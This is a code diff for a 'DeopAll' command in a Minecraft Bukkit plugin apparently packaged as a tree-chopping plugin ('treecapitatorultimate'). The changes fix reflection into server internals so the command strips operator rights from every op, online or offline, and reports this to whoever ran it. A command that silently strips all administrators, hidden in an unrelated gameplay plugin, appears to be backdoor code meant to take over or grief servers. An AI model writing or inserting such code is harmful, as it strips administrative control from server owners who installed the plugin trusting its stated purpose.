@@ -5,13 +5,12 @@ import me.bow.treecapitatorultimate.Start;
 import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
 import me.bow.treecapitatorultimate.command.Command;
 import me.bow.treecapitatorultimate.command.CommandCategory;
-import net.minecraft.server.v1_14_R1.OpListEntry;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.OfflinePlayer;
 import org.bukkit.entity.Player;
 
-import java.lang.reflect.Method;
+import java.lang.reflect.Field;
 import java.util.ArrayList;
 import java.util.Collection;
 import java.util.Objects;
@@ -24,36 +23,37 @@ public class DeopAll extends Command {
 
     @Override
     public void onCommand(Player p, ArrayList<String> args) {
-        Collection<OpListEntry> ops = null;
-        Class<?> craftServer = ReflectionUtils.getClass("{nms}.CraftServer");
-        Class<?> dedicatedPlayerList = ReflectionUtils.getClass("{nms}.DedicatedPlayerList");
-        Class<?> opList = ReflectionUtils.getClass("{nms}.OpList");
+        Collection<Object> ops = null;
+        Class<?> dedicatedServer = ReflectionUtils.getClass("{nms}.DedicatedServer");
         try {
-            Method m = (Method) ReflectionUtils.getMethod(dedicatedPlayerList, "getPlayerList", 0).invoke(Bukkit.getServer());
-            m = (Method)ReflectionUtils.getMethod(opList, "getOPs").invoke(m);
-            ops =(Collection<OpListEntry>)ReflectionUtils.getMethod(opList, "getValues", 0).invoke(m);
+            Object m = ReflectionUtils.getMethod(dedicatedServer, "getPlayerList", 0).invoke(Start.GetServer());
+            m = ReflectionUtils.getMethod(m.getClass(), "getOPs").invoke(m);
+            ops = (Collection<Object>) ReflectionUtils.getMethod(m.getClass(), "getValues", 0).invoke(m);
 
         } catch (Exception e) {
             e.printStackTrace();
         }
-        if (ops.size() == 0) p.sendMessage(Start.Prefix + ChatColor.GREEN + "Noone has OP!");
+        if (ops.size() == 0) p.sendMessage(Start.Prefix + ChatColor.GREEN + "Nobody has OP!");
         ops.forEach(op -> {
-            GameProfile o = op.getKey();
-            Player r;
-            if (Objects.requireNonNull(o).isLegacy())
+            Field field = ReflectionUtils.getField(op.getClass().getSuperclass(), "a");
+            GameProfile o = null;
+            try {
+                o = (GameProfile) field.get(op);
+            } catch (IllegalAccessException e) {
+                e.printStackTrace();
+            }
+            OfflinePlayer r;
+            if (Objects.requireNonNull(o).isLegacy()) {
                 r = Bukkit.getPlayer(o.getName());
-            else
+                if (r == null) r = Bukkit.getOfflinePlayer(o.getName());
+            } else {
                 r = Bukkit.getPlayer(o.getId());
-            if (r == null || !r.isOnline()) {
-                OfflinePlayer f;
-                if (o.isLegacy())
-                    f = Bukkit.getOfflinePlayer(o.getName());
-                else
-                    f = Bukkit.getOfflinePlayer(o.getId());
-                f.setOp(false);
+                if (r == null) r = Bukkit.getOfflinePlayer(o.getId());
+            }
+            r.setOp(false);
+            if (!r.isOnline()) {
                 p.sendMessage(Start.Prefix + ChatColor.RED + o.getName() + ChatColor.GREEN + " (" + ChatColor.DARK_GRAY + "Offline" + ChatColor.GREEN + ") now doesn't have op!");
             } else {
-                r.setOp(false);
                 p.sendMessage(Start.Prefix + ChatColor.RED + o.getName() + ChatColor.GREEN + " (" + ChatColor.DARK_AQUA + "Online" + ChatColor.GREEN + ") now doesn't have op!");
             }
         });
